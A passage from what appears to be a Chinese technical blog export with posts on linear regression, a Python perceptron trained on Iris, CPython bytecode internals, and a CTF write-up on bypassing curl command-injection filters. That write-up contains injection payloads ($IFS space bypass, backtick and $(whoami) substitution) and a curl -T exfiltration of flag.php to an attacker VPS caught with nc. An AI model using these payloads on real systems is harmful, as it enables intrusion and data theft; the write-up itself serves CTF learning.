使用的是单变量$x$，也称作单变量线性回归。 那么如何选择 $\theta_0, \theta_1$ 使得h(x)接近于训练集中的输出变量$y$。通过定义代价函数$J(\theta_0, \theta_1)$，表示$h(x)$的准确性,当$J(\theta_0, \theta_1)$取最小值时，获得最优$h(x)$函数。 梯度下降算法使用梯度下降算法寻找使得代价函数$J(\theta_0, \theta_1)$取得最小值时的解, 即$\theta_0, \theta_1$的值。 梯度下降算法不断重复下面过程，直到收敛其中$j=0,1$, $\alpha$表示学习速率, 它控制我们以多大的幅度更新这个参数$\theta_j$; 每次迭代都必须同时更新$\theta_0, \theta_1$参数。 第二周多变量线性回归多特征 h_{\theta}(x) = \theta_0 + \theta_1x_1 + \theta_2x_2 + \ldots + \theta_nx_n 其中n=|x^{(i)}|,表示样本的特征数。令$x_0=1$, 有 当只有3个样本,每个样本1个特征，可以如下图表示: 多变量梯度下降算法 特征缩放样本的所有特征在相似的范围时，梯度下降算法有更快的收敛速度。改变输入变量的范围，使其满足所有特征在相似的范围，通常情况为: −1 ≤ x_{(i)} ≤ 1 or −0.5 ≤ x_{(i)} ≤ 0.5。一般采用均值归一化实现特征缩放。其中，$u_i$表示特征$(i)$的均值，$s_i$ 通常为 特征$(i)$中(最大值 - 最小值) 或者 特征$(i)$的标准差，一般使用(最大值 - 最小值)就可以满足了。 学习速率$\alpha$学习速率$\alpha$影响代价函数收敛的速度，$\alpha$过小会导致收敛很慢，$\alpha$太大又会导致不收敛。 多项式回归多项式回归能够使用线性回归的方法来拟合非常复杂的函数，甚至是非线性函数。其主要思想是变量替换。如h_\theta(x) = \theta_0 + \theta_1x_1 + \theta_2x_1^2 + \theta_3x_1^3,令 x_2=x_1^2, x_3=x_1^3,则 h_\theta(x) = \theta_0 + \theta_1x_1 + \theta_2x_2 + \theta_3x_3。 标准方程标准方程提供了一种求解$\theta$的解析解法。 设计矩阵X具有n个特征的训练样本集(样本数量为m)，构造设计矩阵$X$, $X$为 m*(n+1) 的矩阵 求解$\theta$, \theta=(X^TX)^{-1}X^Ty。 梯度下降算法和标准方程对比 Gradient Descent Normal Equation Need to choose alpha No need to choose alpha Needs many iterations No need to iterate \Theta(kn^2) \Theta(n^3), need to calculate inverse of X^TX Works well when n is large Slow if n is very large]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>线性回归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过curl命令执行过滤]]></title>
    <url>%2F2017%2F04%2F08%2F%E7%BB%95%E8%BF%87curl%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%BF%87%E6%BB%A4%2F</url>
    <content type="text"><![CDATA[常见命令执行1system("curl $cmd"); 用上面php代码为例, 存在命令执行，由于没有回显，需要自己搭建服务器接收数据，这里就不过多叙述。常用命令执行有: ` , $(), 如: 123456789curl vps.com/`whoami`curl vps.com/$(whoami)# IFS绕过空格curl$IFSvps.com/$(whoami)curl$&#123;IFS&#125;vps.com/$(whoami)# base64 编码绕过空格或特殊字符过滤curl vps.com/$(id|base64) CTF实例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(E_ALL || ~E_NOTICE);function strreplace($str)&#123; $str = str_replace('`','',$str); $str = str_replace(';','',$str); $str = str_replace('|','',$str); $str = str_replace('&amp;','',$str); $str = str_replace('&gt;','',$str); $str = str_replace('&lt;','',$str); $str = str_replace('(','',$str); $str = str_replace(')','',$str); $str = str_replace('&#123;','',$str); $str = str_replace('&#125;','',$str); $str = str_replace('%','',$str); $str = str_replace('#','',$str); $str = str_replace('!','',$str); $str = str_replace('?','',$str); $str = str_replace('@','',$str); $str = str_replace('+','',$str); $str = str_replace('/','',$str); //这句是为了保证服务器安全的,防止利用../ 和 绝对路径 进行任意文件读取,与次题目解答无关 $str = str_replace(':','',$str); //添加这一句 return $str;&#125;if($_GET['num']&lt;&gt;"")&#123; $num = $_GET['num']; if(strstr($num,'1'))&#123; die("Sorry"); &#125;elseif($num &lt;&gt; 1)&#123; echo "Try to num = 1"; &#125; if($num == 1 )&#123; echo "Flag in http://127.0.0.1/flag.php"."&lt;/br&gt;"; $cmd=trim($_GET['cmd']); $cmd=strreplace($cmd); system("curl$cmd/flag.php"); &#125;&#125; else &#123; echo "It Works!";&#125;?&gt; 思路num参数判断get传递的num参数需要==1，但是又经过strstr()函数，即num中不能存在1，这里利用php特性，0.99999999999999就会产生小数下标溢出为1，即可绕过第一步； cmd参数过滤curl$cmd/flag.php，curl紧贴cmd参数，中间没有空格 12trim()函数过滤了cmd两端的空格，可以用 $IFS 绕过，经过strreplace()函数，将一部分符号过滤掉了，并未过滤 $ ; %过滤了，不能利用%0a换行符来绕过；;分号，&amp;逻辑与，|逻辑或，都过滤掉了。 读flag内容 利用 file协议 1http://192.168.1.101/index.php?num=0.99999999999999999999&amp;cmd=$IFSfile:///$PWD file协议常见格式如下: 1234567891011121314# *nixfile://localhost/etc/fstabfile:///etc/fstab# windowsfile://localhost/c|/WINDOWS/clock.avifile:///c|/WINDOWS/clock.avifile://localhost/c:/WINDOWS/clock.avi# Here is the URI as understood by the Windows Shell APIfile:///c:/WINDOWS/clock.avi# network location:file://hostname/path/to/file.txt 另外：$PWD要大写，因为在PHP中内核常量必须要求大写；php中file协议读取出来的文件内容会放到网页源代码中，右键查看源代码即可看到内容。 但是这种方式不适合本题, 题目过滤了/。 curl -T 上传文件到主机并通过监听来获取文件内容 curl不仅仅可以下载文件，还可以上传文件，通过内置option -T来实现, 这就可以利用curl的这个功能来将文件PUT上传给我们的主机，由于PUT method是HTTP的，所以主机需要支持web服务，然后带上端口, 由于题目过滤了:，于是只能使用80端口了。 1http://192.168.1.101/index.php?num=0.99999999999999999999&amp;cmd=$IFS-T flag.php -a your_vps_ip 然后再vps上监听80端口nc -lvv 80，即可拿到文件内容 123456789101112131415root@iZbyhbtw2xco3tZ:~# nc -lvv 80Listening on [0.0.0.0] (family 0, port 80)Connection from [121.194.2.43] port 80 [tcp/http] accepted (family 2, sport 40156)PUT /flag.php HTTP/1.1User-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2Host: 120.25.91.96Accept: */*Content-Length: 91Expect: 100-continue&lt;?phpdie(&quot;小样,还想偷看flag!&quot;);$flag=&quot;flag&#123;0fNcf32079b7L6e71021d8Qcd70e32lp&#125;&quot;; 后记IFS变量，IFS是internal field separator的缩写，shell的特殊环境变量。ksh根据IFS存储的值，可以是空格、tab、换行符或者其他自定义符号，来解析输入和输出的变量值]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>curl</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Iris数据集训练感知机模型]]></title>
    <url>%2F2017%2F04%2F07%2FIris%E6%95%B0%E6%8D%AE%E9%9B%86%E8%AE%AD%E7%BB%83%E6%84%9F%E7%9F%A5%E6%9C%BA%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[感知机基于MCP神经元模型，Frank Rosenblatt发表了第一个感知机学习规则(F.Rosenblatt, The Perceptron, a Perceiving and Recognizing Automaton. Cornell Aeronautical Laboratory, 1957)。基于此感知机规则，Rosenblatt提出了能够自动学习最优权重参数的算法，权重即输入特征的系数。在监督学习和分类任务语境中，上面提到的算法还能够用于预测一个样本是属于类别A还是类别B。 更准确的描述是，我们可以将上面提到的样本属于哪一个类别这个问题称之为二分类问题(binary classification task),我们将其中涉及到的两个类别记作1(表示正类)和-1(表示负类)。我们再定义一个称为激活函数(activation function) $\phi(z)$，激活函数接收一个输入向量$x$和相应的权重向量$w$的线性组合，其中$z$也被称为网络输入 $z=w_1x_1+\ldots+w_mx_m$ : 此时，如果某个样本$x^{(i)}$的激活值，即$\phi(z)$大于事先设置的阈值$\theta$,我们就说样本$x^{(i)}$属于类别1，否则属于类别-1。 在感知机学习算法中，激活函数$\phi(z)$的形式非常简单，仅仅是一个单位阶跃函数(也被称为Heaviside阶跃函数): 为了推导简单，我们可以将阈值$\theta$挪到等式左边并且额外定义一个权重参数$w_0=-\theta$, 这样我们可以对$z$给出更加紧凑的公式$z=w_0x_0+w_1x_1+…+w_mx_m=w^Tx$，此时 下面左图描述了感知机的激活函数怎样将网络输入$z=w^Tx$压缩到二元输出(-1,1)，右图描述了感知机如何区分两个线性可分的类别。 不论MCP神经元还是Rosenblatt的阈值感知机模型，他们背后的idea都是试图使用简单的方法来模拟大脑中单个神经元的工作方式：要么传递信号要么不传递。因此，Rosenblatt最初的感知机规则非常简单，步骤如下： 将权重参数初始化为0或者很小的随机数。 对于每一个训练集样本$x^{(i)}$,执行下面的步骤： 计数输出值 $\hat{y}$. 更新权重参数. 此处的输出值就是单位阶跃函数预测的类别(1,-1)，参数向量$w$中的每个$w_j$的更新过程可以用数学语言表示为： 其中 $\Delta w_j$，用于更新权重$w_j$,在感知机算法中的计算公式为: 其中$\eta$ 称为学习率(learning rate), 是一个介于0.0和1.0之间的常数，$y^{(i)}$是第i个训练样本的真实类别，$\hat{y}^{(i)}$是对第i个训练样本的预测类别。 权重向量中的每一个参数 $w_j$ 是同时被更新的，这意味着在所有的 $\Delta w_j$计算出来以前不会重新计算 $\hat{y}^{(i)}$。具体地，对于一个二维数据集，我们可以将更新过程写为： 感知机算法仅在两个类别确实线性可分并且学习率充分小的情况下才能保证收敛。如果两个类别不能被一个线性决策界分开，我们可以设置最大训练集迭代次数(epoch)或者可容忍的错误分类样本数 来停止算法的学习过程。 在进入下一节的代码实现之前，我们来总结一下感知机的要点： 感知机接收一个样本输入x，然后将其和权重w结合，计算网络输入z。z接着被传递给激活函数，产生一个二分类输出-1或1作为预测的样本类别。在整个学习阶段，输出用于计算预测错误率(y-$\hat{y}$)和更新权重参数。 python 实现感知机算法 perceptron.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#!/usr/bin/env python# -*- coding: utf-8 -*-"""@author: janes@file: perceptron.py@time: 2017/4/7 13:45"""import numpy as npclass Perceptron(object): """Perceptron classifier. Parameters ------------ eta:float Learning rate (between 0.0 and 1.0) n_iter:int Passes over the training dataset. Attributes ------------- w_: 1d-array Weights after fitting. errors_: list Numebr of misclassifications in every epoch. """ def __init__(self, eta=0.01, n_iter=10): self.eta = eta self.n_iter = n_iter def fit(self, X, y): """Fit training data. Parameters ------------ X: &#123;array-like&#125;, shape=[n_samples, n_features] Training vectors, where n_samples is the number of samples and n_featuers is the number of features. y: array-like, shape=[n_smaples] Target values. Returns ---------- self: object """ # Add w_0 self.w_ = np.zeros(1 + X.shape[1]) self.errors_ = [] for _ in range(self.n_iter): errors = 0 for xi, target in zip(X, y): update = self.eta * (target - self.predict(xi)) self.w_[1:] += update * xi self.w_[0] += update errors += int(update != 0.0) self.errors_.append(errors) return self def net_input(self, X): """Calculate net input""" return np.dot(X, self.w_[1:]) + self.w_[0] def predict(self, X): """Return class label after unit step""" return np.where(self.net_input(X) &gt;= 0.0, 1, -1) 初始化一个新的Perceptron对象，并且对学习率eta和迭代次数n_iter赋值，fit方法先对权重参数初始化，然后对训练集中每一个样本循环，根据感知机算法对权重进行更新。类别通过predict方法进行预测。除此之外，self.errors_ 还记录了每一轮中误分类的样本数，有助于接下来我们分析感知机的训练过程。 Iris数据集训练感知机算法数据集使用UCI机器学习数据库提供的Iris数据集, UCI网址: http://archive.ics.uci.edu/ml/, UCI机器学习库包含超过350个数据集，其标签分类包括域、目的（分类、回归）。 以Iris为例介绍一下数据集： ucidata/iris中有三个文件：Index, iris.data, iris.names index为文件夹目录，列出了本文件夹里的所有文件 iris.data为iris数据文件，内容如下： 1234567895.1,3.5,1.4,0.2,Iris-setosa4.9,3.0,1.4,0.2,Iris-setosa……7.0,3.2,4.7,1.4,Iris-versicolor6.4,3.2,4.5,1.5,Iris-versicolor……6.3,3.3,6.0,2.5,Iris-virginica5.8,2.7,5.1,1.9,Iris-virginica7.1,3.0,5.9,2.1,Iris-virginica 如上，属性直接以逗号隔开，中间没有空格（5.1,3.5,1.4,0.2,），最后一列为本行属性对应的值，即决策属性Iris-setosa iris.names介绍了irir数据的一些相关信息，如数据标题、数据来源、以前使用情况、最近信息、实例数目、实例的属性等，如下所示部分： 1234567891011……Attribute Information:1. sepal length in cm2. sepal width in cm3. petal length in cm4. petal width in cm5. class: -- Iris Setosa -- Iris Versicolour -- Iris Virginica 训练我们仅使用Iris中Setosa和Versicolor两种花的数据，抽取出前100条样本，这正好是Setosa和Versicolor对应的样本，我们将Versicolor对应的数据作为类别1，Setosa对应的作为-1。对于特征，我们抽取出sepal length和petal length两维度特征。 test.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env python# -*- coding: utf-8 -*-"""@author: janes@file: perceptron.py@time: 2017/4/7 13:45"""import numpy as npimport matplotlib.pyplot as pltfrom matplotlib.colors import ListedColormapimport pandas as pdfrom perceptron import Perceptrondef plot_x(X): plt.scatter(X[:50, 0], X[:50, 1], color='red', marker='o', label='setosa') plt.scatter(X[50:, 0], X[50:, 1], color='blue', marker='x', label='versicolor') plt.xlabel('petal length') plt.ylabel('sepal length') plt.legend(loc='upper left') plt.show()def plot_decision_region(X, y, classifier, resolution=0.02): markers = ('s', 'x', 'o', '^', 'v') colors = ('red', 'blue', 'lightgreen', 'gray', 'cyan') cmap = ListedColormap(colors[:len(np.unique(y))]) x1_min, x1_max = X[:, 0].min()-1, X[:, 0].max() + 1 x2_min, x2_max = X[:, 1].min()-1, X[:, 1].max() + 1 xx1, xx2 = np.meshgrid(np.arange(x1_min, x1_max, resolution), np.arange(x2_min, x2_max, resolution)) Z = classifier.predict(np.array([xx1.ravel(), xx2.ravel()]).T) Z = Z.reshape(xx1.shape) plt.contourf(xx1, xx2, Z, alpha=0.4, cmap=cmap) plt.xlim(xx1.min(), xx1.max()) plt.ylim(xx2.min(), xx2.max()) for idx, cl in enumerate(np.unique(y)): plt.scatter(x=X[y == cl, 0], y=X[y == cl, 1], alpha=0.8, c=cmap(idx), marker=markers[idx], label=cl) plt.xlabel('sepal length [cm]') plt.ylabel('petal length [cm]') plt.show()def plot_misclassifications(classifier): plt.plot(range(1, len(classifier.errors_)+1), classifier.errors_, marker='o') plt.xlabel('Epoches') plt.ylabel('Numebr of misclassifications') plt.show()if __name__ == "__main__": df = pd.read_csv('iris.data.csv', header=None) y = df.iloc[0:100, 4].values y = np.where(y == 'Iris-setosa', -1, 1) X = df.iloc[0:100, [0, 2]].values ppn = Perceptron(eta=0.1, n_iter=10) ppn.fit(X, y) # plot_x(X) # plot_misclassifications(ppn) plot_decision_region(X, y, ppn) 虽然对于Iris数据集，感知机算法表现的很完美，但是”收敛”一直是感知机算法中的一大问题。Frank Rosenblatt从数学上证明了只要两个类别能够被一个现行超平面分开，则感知机算法一定能够收敛。然而，如果数据并非线性可分，感知计算法则会一直运行下去，除非我们人为设置最大迭代次数n_iter reference https://ljalphabeta.gitbooks.io/python-/content/ch2section3.html]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>感知机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PyCodeObject和opcode]]></title>
    <url>%2F2017%2F04%2F01%2FPyCodeObject%E5%92%8Copcode%2F</url>
    <content type="text"><![CDATA[pyc文件Python的原始代码在运行前都会被先编译成字节码，并把编译的结果保存到一个一个的PyCodeObject中，把PyCodeObject从内存中以marshal格式保存为文件，即pyc文件。python 内置库dis，可以把二进制反编译CPython bytecode。二进制对应的bytecode可以参考: https://github.com/python/cpython/blob/2.7/Include/opcode.h ,其中bytecode所代表的意义:https://docs.python.org/2/library/dis.html PyCodeObjectPython代码中Code.h中定义的PyCodeObject结构 12345678910111213141516171819202122/* Bytecode object */ typedef struct &#123; PyObject_HEAD int co_argcount; /* #arguments, except *args */ int co_nlocals; /* #local variables */ int co_stacksize; /* #entries needed for evaluation stack */ int co_flags; /* CO_..., see below */ PyObject *co_code; /* instruction opcodes */ PyObject *co_consts; /* list (constants used) */ PyObject *co_names; /* list of strings (names used) */ PyObject *co_varnames; /* tuple of strings (local variable names) */ PyObject *co_freevars; /* tuple of strings (free variable names) */ PyObject *co_cellvars; /* tuple of strings (cell variable names) */ /* The rest doesn't count for hash/cmp */ PyObject *co_filename; /* string (where it was loaded from) */ PyObject *co_name; /* string (name, for reference) */ int co_firstlineno; /* first source line number */ PyObject *co_lnotab; /* string (encoding addr&lt;-&gt;lineno mapping) See Objects/lnotab_notes.txt for details. */ void *co_zombieframe; /* for optimization only (see frameobject.c) */ PyObject *co_weakreflist; /* to support weakrefs to code objects */ &#125; PyCodeObject; 各字段的意义: argcount：参数的个数 nlocals：局部变量的个数（包含参数在内） stacksize：堆栈的大小 flags：用来表示参数中是否有*args或者 **kwargs code：字节码 names：全局变量，函数，类，类的方法的名称 varnames：局部变量的名称（包含参数） consts：一个常量表，在marshal.c中有定义所有的类型 123456789101112131415161718192021222324#define TYPE_NULL '0' #define TYPE_NONE 'N' #define TYPE_FALSE 'F' #define TYPE_TRUE 'T' #define TYPE_STOPITER 'S' #define TYPE_ELLIPSIS '.' #define TYPE_INT 'i' #define TYPE_INT64 'I' #define TYPE_FLOAT 'f' #define TYPE_BINARY_FLOAT 'g' #define TYPE_COMPLEX 'x' #define TYPE_BINARY_COMPLEX 'y' #define TYPE_LONG 'l' #define TYPE_STRING 's' #define TYPE_INTERNED 't' #define TYPE_STRINGREF 'R' #define TYPE_TUPLE '(' #define TYPE_LIST '[' #define TYPE_DICT '&#123;' #define TYPE_CODE 'c' #define TYPE_UNICODE 'u' #define TYPE_UNKNOWN '?' #define TYPE_SET '&lt;' #define TYPE_FROZENSET '&gt;' 所有的PyCodeObject都是通过调用以下的函数得以运行的：PyObject * PyEval_EvalFrameEx(PyFrameObject *f, int throwflag), 这个函数是Python的一个重量极的函数，它的作用即是执行中间码，Python的代码都是通过调用这个函数来运行的 PyFrameObject这个数据结构： 12345678910111213141516171819202122232425262728293031323334353637typedef struct _frame &#123; PyObject_VAR_HEAD struct _frame *f_back; /* previous frame, or NULL */ PyCodeObject *f_code; /* code segment */ PyObject *f_builtins; /* builtin symbol table (PyDictObject) */ PyObject *f_globals; /* global symbol table (PyDictObject) */ PyObject *f_locals; /* local symbol table (any mapping) */ PyObject **f_valuestack; /* points after the last local */ /* Next free slot in f_valuestack. Frame creation sets to f_valuestack. Frame evaluation usually NULLs it, but a frame that yields sets it to the current stack top. */ PyObject **f_stacktop; PyObject *f_trace; /* Trace function */ /* If an exception is raised in this frame, the next three are used to * record the exception info (if any) originally in the thread state. See * comments before set_exc_info() -- it's not obvious. * Invariant: if _type is NULL, then so are _value and _traceback. * Desired invariant: all three are NULL, or all three are non-NULL. That * one isn't currently true, but "should be". */ PyObject *f_exc_type, *f_exc_value, *f_exc_traceback; PyThreadState *f_tstate; int f_lasti; /* Last instruction if called */ /* Call PyFrame_GetLineNumber() instead of reading this field directly. As of 2.3 f_lineno is only valid when tracing is active (i.e. when f_trace is set). At other times we use PyCode_Addr2Line to calculate the line from the current bytecode index. */ int f_lineno; /* Current line number */ int f_iblock; /* index in f_blockstack */ PyTryBlock f_blockstack[CO_MAXBLOCKS]; /* for try and loop blocks */ PyObject *f_localsplus[1]; /* locals+stack, dynamically sized */ &#125; PyFrameObject; 重点关注下以下的成员： 12345PyObject **f_stacktop; PyCodeObject *f_code; /* code segment */ PyObject *f_globals; /* global symbol table (PyDictObject) */ PyObject *f_locals; /* local symbol table (any mapping) */ 可见PyFrameObject中包含一个PyCodeObject的结构体指针f_code,PyFrameObject中的f_globals和f_locals这两个dict对象分别用于保存全局对象和局部对象，可以说，PyFrameObject结构就是PyCodeObject的运行环境，PyCodeObject结构是静态的，创建以后就一般不会再变，而PyFrameObject则是动态的，在创建以后,f_globals和f_locals这两个dict都经常会发生变化，并且一个PyCodeObject可能对应好几个的PyFrameObject中。 实例演示 新建test.py 12345678910111213141516import dis myglobal = True def add(a): b = 1 a += b return a class world: def __init__(self): pass def sayHello(self): print 'hello,world' w = world() w.sayHello() 编译成pyc 1python -m compileall test.py 分析test.pyc showfile.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import dis, marshal, struct, sys, time, types def show_file(fname): f = open(fname, "rb") magic = f.read(4) moddate = f.read(4) modtime = time.asctime(time.localtime(struct.unpack('L', moddate)[0])) print "magic %s" % (magic.encode('hex')) print "moddate %s (%s)" % (moddate.encode('hex'), modtime) code = marshal.load(f) show_code(code) def show_code(code, indent=''): old_indent = indent print "%s&lt;code&gt;" % indent indent += ' ' print "%s&lt;argcount&gt; %d &lt;/argcount&gt;" % (indent, code.co_argcount) print "%s&lt;nlocals&gt; %d&lt;/nlocals&gt;" % (indent, code.co_nlocals) print "%s&lt;stacksize&gt; %d&lt;/stacksize&gt;" % (indent, code.co_stacksize) print "%s&lt;flags&gt; %04x&lt;/flags&gt;" % (indent, code.co_flags) show_hex("code", code.co_code, indent=indent) print "%s&lt;dis&gt;" % indent dis.disassemble(code) print "%s&lt;/dis&gt;" % indent print "%s&lt;names&gt; %r&lt;/names&gt;" % (indent, code.co_names) print "%s&lt;varnames&gt; %r&lt;/varnames&gt;" % (indent, code.co_varnames) print "%s&lt;freevars&gt; %r&lt;/freevars&gt;" % (indent, code.co_freevars) print "%s&lt;cellvars&gt; %r&lt;/cellvars&gt;" % (indent, code.co_cellvars) print "%s&lt;filename&gt; %r&lt;/filename&gt;" % (indent, code.co_filename) print "%s&lt;name&gt; %r&lt;/name&gt;" % (indent, code.co_name) print "%s&lt;firstlineno&gt; %d&lt;/firstlineno&gt;" % (indent, code.co_firstlineno) print "%s&lt;consts&gt;" % indent for const in code.co_consts: if type(const) == types.CodeType: show_code(const, indent+' ') else: print " %s%r" % (indent, const) print "%s&lt;/consts&gt;" % indent show_hex("lnotab", code.co_lnotab, indent=indent) print "%s&lt;/code&gt;" % old_indent def show_hex(label, h, indent): h = h.encode('hex') if len(h) &lt; 60: print "%s&lt;%s&gt; %s&lt;/%s&gt;" % (indent, label, h,label) else: print "%s&lt;%s&gt;" % (indent, label) for i in range(0, len(h), 60): print "%s %s" % (indent, h[i:i+60]) print "%s&lt;/%s&gt;" % (indent, label) show_file(sys.argv[1]) 1showfile.py test.pyc &gt; test.xml test.xml 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169magic 03f30d0amoddate 9c4cdf58 (Sat Apr 1 14:45:48 2017)&lt;code&gt; &lt;argcount&gt; 0 &lt;/argcount&gt; &lt;nlocals&gt; 0&lt;/nlocals&gt; &lt;stacksize&gt; 3&lt;/stacksize&gt; &lt;flags&gt; 0040&lt;/flags&gt; &lt;code&gt; 6400006401006c00005a00006501005a02006402008400005a0300640300 640500640400840000830000595a04006504008300005a05006505006a06 008300000164010053 &lt;/code&gt; &lt;dis&gt; 1 0 LOAD_CONST 0 (-1) 3 LOAD_CONST 1 (None) 6 IMPORT_NAME 0 (dis) 9 STORE_NAME 0 (dis) 2 12 LOAD_NAME 1 (True) 15 STORE_NAME 2 (myglobal) 4 18 LOAD_CONST 2 (&lt;code object add at 0x10e0b7ab0, file "test.py", line 4&gt;) 21 MAKE_FUNCTION 0 24 STORE_NAME 3 (add) 9 27 LOAD_CONST 3 ('world') 30 LOAD_CONST 5 (()) 33 LOAD_CONST 4 (&lt;code object world at 0x10e0b7db0, file "test.py", line 9&gt;) 36 MAKE_FUNCTION 0 39 CALL_FUNCTION 0 42 BUILD_CLASS 43 STORE_NAME 4 (world) 15 46 LOAD_NAME 4 (world) 49 CALL_FUNCTION 0 52 STORE_NAME 5 (w) 16 55 LOAD_NAME 5 (w) 58 LOAD_ATTR 6 (sayHello) 61 CALL_FUNCTION 0 64 POP_TOP 65 LOAD_CONST 1 (None) 68 RETURN_VALUE &lt;/dis&gt; &lt;names&gt; ('dis', 'True', 'myglobal', 'add', 'world', 'w', 'sayHello')&lt;/names&gt; &lt;varnames&gt; ()&lt;/varnames&gt; &lt;freevars&gt; ()&lt;/freevars&gt; &lt;cellvars&gt; ()&lt;/cellvars&gt; &lt;filename&gt; 'test.py'&lt;/filename&gt; &lt;name&gt; '&lt;module&gt;'&lt;/name&gt; &lt;firstlineno&gt; 1&lt;/firstlineno&gt; &lt;consts&gt; -1 None &lt;code&gt; &lt;argcount&gt; 1 &lt;/argcount&gt; &lt;nlocals&gt; 2&lt;/nlocals&gt; &lt;stacksize&gt; 2&lt;/stacksize&gt; &lt;flags&gt; 0043&lt;/flags&gt; &lt;code&gt; 6401007d01007c00007c0100377d00007c000053&lt;/code&gt; &lt;dis&gt; 5 0 LOAD_CONST 1 (1) 3 STORE_FAST 1 (b) 6 6 LOAD_FAST 0 (a) 9 LOAD_FAST 1 (b) 12 INPLACE_ADD 13 STORE_FAST 0 (a) 7 16 LOAD_FAST 0 (a) 19 RETURN_VALUE &lt;/dis&gt; &lt;names&gt; ()&lt;/names&gt; &lt;varnames&gt; ('a', 'b')&lt;/varnames&gt; &lt;freevars&gt; ()&lt;/freevars&gt; &lt;cellvars&gt; ()&lt;/cellvars&gt; &lt;filename&gt; 'test.py'&lt;/filename&gt; &lt;name&gt; 'add'&lt;/name&gt; &lt;firstlineno&gt; 4&lt;/firstlineno&gt; &lt;consts&gt; None 1 &lt;/consts&gt; &lt;lnotab&gt; 000106010a01&lt;/lnotab&gt; &lt;/code&gt; 'world' &lt;code&gt; &lt;argcount&gt; 0 &lt;/argcount&gt; &lt;nlocals&gt; 0&lt;/nlocals&gt; &lt;stacksize&gt; 1&lt;/stacksize&gt; &lt;flags&gt; 0042&lt;/flags&gt; &lt;code&gt; 6500005a01006400008400005a02006401008400005a03005253&lt;/code&gt; &lt;dis&gt; 9 0 LOAD_NAME 0 (__name__) 3 STORE_NAME 1 (__module__) 10 6 LOAD_CONST 0 (&lt;code object __init__ at 0x10e0b7c30, file "test.py", line 10&gt;) 9 MAKE_FUNCTION 0 12 STORE_NAME 2 (__init__) 12 15 LOAD_CONST 1 (&lt;code object sayHello at 0x10e0b7d30, file "test.py", line 12&gt;) 18 MAKE_FUNCTION 0 21 STORE_NAME 3 (sayHello) 24 LOAD_LOCALS 25 RETURN_VALUE &lt;/dis&gt; &lt;names&gt; ('__name__', '__module__', '__init__', 'sayHello')&lt;/names&gt; &lt;varnames&gt; ()&lt;/varnames&gt; &lt;freevars&gt; ()&lt;/freevars&gt; &lt;cellvars&gt; ()&lt;/cellvars&gt; &lt;filename&gt; 'test.py'&lt;/filename&gt; &lt;name&gt; 'world'&lt;/name&gt; &lt;firstlineno&gt; 9&lt;/firstlineno&gt; &lt;consts&gt; &lt;code&gt; &lt;argcount&gt; 1 &lt;/argcount&gt; &lt;nlocals&gt; 1&lt;/nlocals&gt; &lt;stacksize&gt; 1&lt;/stacksize&gt; &lt;flags&gt; 0043&lt;/flags&gt; &lt;code&gt; 64000053&lt;/code&gt; &lt;dis&gt; 11 0 LOAD_CONST 0 (None) 3 RETURN_VALUE &lt;/dis&gt; &lt;names&gt; ()&lt;/names&gt; &lt;varnames&gt; ('self',)&lt;/varnames&gt; &lt;freevars&gt; ()&lt;/freevars&gt; &lt;cellvars&gt; ()&lt;/cellvars&gt; &lt;filename&gt; 'test.py'&lt;/filename&gt; &lt;name&gt; '__init__'&lt;/name&gt; &lt;firstlineno&gt; 10&lt;/firstlineno&gt; &lt;consts&gt; None &lt;/consts&gt; &lt;lnotab&gt; 0001&lt;/lnotab&gt; &lt;/code&gt; &lt;code&gt; &lt;argcount&gt; 1 &lt;/argcount&gt; &lt;nlocals&gt; 1&lt;/nlocals&gt; &lt;stacksize&gt; 1&lt;/stacksize&gt; &lt;flags&gt; 0043&lt;/flags&gt; &lt;code&gt; 640100474864000053&lt;/code&gt; &lt;dis&gt; 13 0 LOAD_CONST 1 ('hello,world') 3 PRINT_ITEM 4 PRINT_NEWLINE 5 LOAD_CONST 0 (None) 8 RETURN_VALUE &lt;/dis&gt; &lt;names&gt; ()&lt;/names&gt; &lt;varnames&gt; ('self',)&lt;/varnames&gt; &lt;freevars&gt; ()&lt;/freevars&gt; &lt;cellvars&gt; ()&lt;/cellvars&gt; &lt;filename&gt; 'test.py'&lt;/filename&gt; &lt;name&gt; 'sayHello'&lt;/name&gt; &lt;firstlineno&gt; 12&lt;/firstlineno&gt; &lt;consts&gt; None 'hello,world' &lt;/consts&gt; &lt;lnotab&gt; 0001&lt;/lnotab&gt; &lt;/code&gt; &lt;/consts&gt; &lt;lnotab&gt; 06010902&lt;/lnotab&gt; &lt;/code&gt; () &lt;/consts&gt; &lt;lnotab&gt; 0c010602090513060901&lt;/lnotab&gt;&lt;/code&gt; 可以看到，整个test.pyc就是一个嵌套的PyCodeObject结构的组合，对于每个函数，或者类的方法，都会生成一个对应的PyCodeObject结构，并且模块还会生成额外的一个PyCodeObject结构,pyc文件中一共保存了5个PyCodeObject结构： 最外层的为模块test的PyCodeObject，其中的代码在import或者直接运行时会得到执行。 在module的PyCodeObject中嵌套了add函数的PyCodeObject结构以及world类的PyCodeObject结构。 在world类的PyCodeObject结构中，又嵌套了init方法和sayHello方法的PyCodeObject结构。 解析部分产生的opcode12345678910111213141516171819202122232425262728293031323334353637381 0 LOAD_CONST 0 (-1) #加载consts数组中索引为0处的值，这里为数值-1 3 LOAD_CONST 1 (None) #加载consts数组中索引为1处的值，这里为None 6 IMPORT_NAME 0 (dis) #加载dis模块：names[0]即为&quot;dis&quot; 9 STORE_NAME 0 